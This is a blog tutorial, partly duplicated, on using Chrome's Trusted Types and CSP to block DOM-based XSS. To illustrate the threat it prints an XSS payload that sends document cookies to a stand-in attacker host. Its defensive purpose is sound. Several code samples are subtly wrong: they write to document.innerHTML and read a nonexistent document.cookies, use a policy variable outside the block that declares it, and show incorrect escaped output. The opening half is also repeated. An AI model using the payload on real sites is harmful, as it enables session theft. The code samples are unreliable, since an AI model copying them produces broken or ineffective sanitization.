---
title: "Trusted Types to prevent DOM-based XSS attacks"
slug: trusted-types-to-prevent-dom-based-xss-attacks 
author: Adhham
date: 2020-05-20
tags:
  - security
  - xss
---

Cross-Site Script (XSS) attacks happen when a user-controlled data is allowed into site without proper sanitization, that it cause malicious scripts and codes embedded with the data to be executed from the site. XSS attacks are a common and a dangerous security vulnerability.

To prevent such attacks, you are advised to use proper sanitization and look for and remove any potentially dangerous HTML code in user submitted data before saving it in the database and rendering it from the website.

An XSS attack might happen from the server-side. But it can also occur from the client-side when passing user-generated data into certain JavaScript functions that dynamically alters the page content (eg. `document.innerHTML`).

To give an example, we have a simple JavaScript code that asks user to enter their name and display it on the site.

    const name = document.querySelector('input').value;
    document.innerHTML = 'Hi! ' + name;

A benign user might type "Tom", "Dick" or "Harry" in the field, but a user with malicious intents might type the following.

    <script>window.location = 'https://stealcookies.com/?cookies=' + escape(document.cookies)</script>

Once the code gets executed, the page will be redirected to "stealcookies.com" with all the cookies and session data.

That's where Chrome's new [Trusted Types](https://w3c.github.io/webappsec-trusted-types/dist/spec/) come in. Trusted Types helps to secure your application from DOM-based XSS vulnerabilities by providing the tools to write secure code and by blocking dangerous API functions.

### Trusted Types

Trusted Types puts a lock on JavaScript sink functions and prevents its execution.

*   It locks the manipulation of `<script src>` and the contents of the `<script>` elements
*   It locks the JavaScript functions for generating HTML content from a string: [`innerHTML`](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML), [`outerHTML`](https://developer.mozilla.org/en-US/docs/Web/API/Element/outerHTML),[`insertAdjacentHTML`](https://developer.mozilla.org/en-US/docs/Web/API/Element/insertAdjacentHTML), [`document.write`](https://developer.mozilla.org/en-US/docs/Web/API/Document/write), [`document.writeln`](https://developer.mozilla.org/en-US/docs/Web/API/Document/writeln)
*   Execution of plugin content: [`<embed src>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed#attr-src), [`<object data>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object#attr-data) and [`<object codebase>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object#attr-codebase)
*   Runtime JavaScript code compilation: `eval`, `setTimeout`, `setInterval`, `new Function()`

Let's say you have the following code.

    document.innerHTML = '<b>I am a bold man!</b>'

With the Trusted Types enabled, the above code will throw a `TypeError`. Trusted Types ensures that any value that goes into a DOM XSS sink function are sanitized and processed. Hence, passing just a string gives you an error and thereby prevents the use of sink functions with strings.

> Note: Before you can start using Trusted Types you need to [set the appropriate CSP header](https://web.dev/trusted-types/#how-to-use-trusted-types). You can either set a normal CSP or a report-only one, in which case violations will only be reported but not enforced (ie. the execution will not be blocked). You can read more about the concept of CSP on [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

Instead of passing strings, we need to pass in a special trusted object to the function so that the browser can know it's trustworthy and that it's safely processed and sanitized. For that, Trusted Types has a wonderful API.

Using the Trusted Types API, we can create a Trusted Type Policy which will sanitize the HTML code.

    if (window.trustedTypes && trustedTypes.createPolicy) { 
      const myPolicy = trustedTypes.createPolicy('myPolicy', {
        createHTML: string => string.replace(/\</g, '&lt;')
      });
    }

Here we are creating a policy named `myPolicy` which contains the function `createHTML`. It takes a string as an argument and replace all `<` with `&alt;` (in other word escapes the HTML tags.)

Now, when we pass value to JavaScript sink functions we can use our Trusted Type Policy instead of string.

    document.innerHTML = myPolicy.createHTML('<b>I am a bold man!</b>');

Now that we've ensured that our application is secure from DOM-based XSS vulnerabilities, we can proceed to rewrite our previous example using our policy.

    const name = document.querySelector('input').value;
    document.innerHTML = myPolicy.createHTML('Hi! ' + name);

### Default Policy

There are times in which you are not able to rewrite all of your code to enforce the Trusted Type Policies. For example, you might have scripts loaded from CDN or a lot of legacy code or third-party libraries that needs to be dealt with. For that, you can use [default](https://w3c.github.io/webappsec-trusted-types/dist/spec/#default-policy-hdr) policies.

    if (window.trustedTypes && trustedTypes.createPolicy) { 
      trustedTypes.createPolicy('default', {
        createHTML: (string, sink) => string.replace(/\</g, '&lt;')
      });
    }
2020-05-20 22:17

# Trusted Types to prevent DOM-based XSS attacks

Cross-Site Script (XSS) attacks happen when a user-controlled data is allowed into site without proper sanitization, that it cause malicious scripts and codes embedded with the data to be executed from the site. XSS attacks are a common and a dangerous security vulnerability.

To prevent such attacks, you are advised to use proper sanitization and look for and remove any potentially dangerous HTML code in user submitted data before saving it in the database and rendering it from the website.

An XSS attack might happen from the server-side. But it can also occur from the client-side when passing user-generated data into certain JavaScript functions that dynamically alters the page content (eg. `document.innerHTML`).

To give an example, we have a simple JavaScript code that asks user to enter their name and display it on the site.

    const name = document.querySelector('input').value;
    document.innerHTML = 'Hi! ' + name;

A benign user might type "Tom", "Dick" or "Harry" in the field, but a user with malicious intents might type the following.

    <script>window.location = 'https://stealcookies.com/?cookies=' + escape(document.cookies)</script>

Once the code gets executed, the page will be redirected to "stealcookies.com" with all the cookies and session data.

That's where Chrome's new [Trusted Types](https://w3c.github.io/webappsec-trusted-types/dist/spec/) come in. Trusted Types helps to secure your application from DOM-based XSS vulnerabilities by providing the tools to write secure code and by blocking dangerous API functions.

### Trusted Types

Trusted Types puts a lock on JavaScript sink functions and prevents its execution.

*   It locks the manipulation of `<script src>` and the contents of the `<script>` elements
*   It locks the JavaScript functions for generating HTML content from a string: [`innerHTML`](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML), [`outerHTML`](https://developer.mozilla.org/en-US/docs/Web/API/Element/outerHTML),[`insertAdjacentHTML`](https://developer.mozilla.org/en-US/docs/Web/API/Element/insertAdjacentHTML), [`document.write`](https://developer.mozilla.org/en-US/docs/Web/API/Document/write), [`document.writeln`](https://developer.mozilla.org/en-US/docs/Web/API/Document/writeln)
*   Execution of plugin content: [`<embed src>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed#attr-src), [`<object data>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object#attr-data) and [`<object codebase>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object#attr-codebase)
*   Runtime JavaScript code compilation: `eval`, `setTimeout`, `setInterval`, `new Function()`

Let's say you have the following code.

    document.innerHTML = '<b>I am a bold man!</b>'

With the Trusted Types enabled, the above code will throw a `TypeError`. Trusted Types ensures that any value that goes into a DOM XSS sink function are sanitized and processed. Hence, passing just a string gives you an error and thereby prevents the use of sink functions with strings.

> Note: Before you can start using Trusted Types you need to [set the appropriate CSP header](https://web.dev/trusted-types/#how-to-use-trusted-types). You can either set a normal CSP or a report-only one, in which case violations will only be reported but not enforced (ie. the execution will not be blocked). You can read more about the concept of CSP on [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

Instead of passing strings, we need to pass in a special trusted object to the function so that the browser can know it's trustworthy and that it's safely processed and sanitized. For that, Trusted Types has a wonderful API.

Using the Trusted Types API, we can create a Trusted Type Policy which will sanitize the HTML code.

    if (window.trustedTypes && trustedTypes.createPolicy) { 
      const myPolicy = trustedTypes.createPolicy('myPolicy', {
        createHTML: string => string.replace(/\</g, '&lt;')
      });
    }

Here we are creating a policy named `myPolicy` which contains the function `createHTML`. It takes a string as an argument and replace all `<` with `&alt;` (in other word escapes the HTML tags.)

Now, when we pass value to JavaScript sink functions we can use our Trusted Type Policy instead of string.

    document.innerHTML = myPolicy.createHTML('<b>I am a bold man!</b>');

Now that we've ensured that our application is secure from DOM-based XSS vulnerabilities, we can proceed to rewrite our previous example using our policy.

    const name = document.querySelector('input').value;
    document.innerHTML = myPolicy.createHTML('Hi! ' + name);

### Default Policy

There are times in which you are not able to rewrite all of your code to enforce the Trusted Type Policies. For example, you might have scripts loaded from CDN or a lot of legacy code or third-party libraries that needs to be dealt with. For that, you can use [default](https://w3c.github.io/webappsec-trusted-types/dist/spec/#default-policy-hdr) policies.

    if (window.trustedTypes && trustedTypes.createPolicy) { 
      trustedTypes.createPolicy('default', {
        createHTML: (string, sink) => string.replace(/\</g, '&lt;')
      });
    }

What a default policy does is that it implicitly applies the policy to strings that are passed into sinks.

    document.innerHTML = '<b>I am a bold man!</b>';
    console.log(document.innerHTML);
    // &lt;b&lt;I am a bold man!&lt;/b&lt;

> The specification suggests that you should only use default policies in a transitional period to rewrite the dependencies, and eliminate the use of them afterwards. Thus, it should be used sparingly and preference should be given to the use of regular policies.

You might have notice a caveat here – using Trusted Types doesn't make the code intrinsically secure. If you have insecure code (eg: that does not properly sanitize input) in your Trusted Type Policy, then your code will be still susceptible to DOM-based XSS attacks. It doesn't make it secure anymore.

But what Trusted Types does is provide you with the tools that helps you to write and maintain security rules and policies related to the application. You could have used a simple JavaScript function to sanitize the HTML code without resorting to Trusted Types, and still achieve the same result. But the benefit of opting Trusted Types is that it ensure that no data or input is passed to a JavaScript sink function without going through proper sanitization (as it will throw an error and block the execution of the function). As the application gets bigger, it also helps to maintain all of your security rules and policies in a centralized mechanism.

This is just a short introduction. The [explainer](https://github.com/w3c/webappsec-trusted-types/blob/master/explainer.md) at w3c's Trusted Types repo goes onto the details of the whole idea and what it aims to solve. Finally, check out [web.dev's article](https://web.dev/trusted-types/) on the topic for more in-depth information on how to implement it.

* * *

*   Read the Trusted Type's [specification draft.](https://w3c.github.io/webappsec-trusted-types/dist/spec/)
*   Trusted Types are introduced in Chrome 83; for other browsers and older versions of chrome you can use a [polyfill](https://github.com/w3c/webappsec-trusted-types).
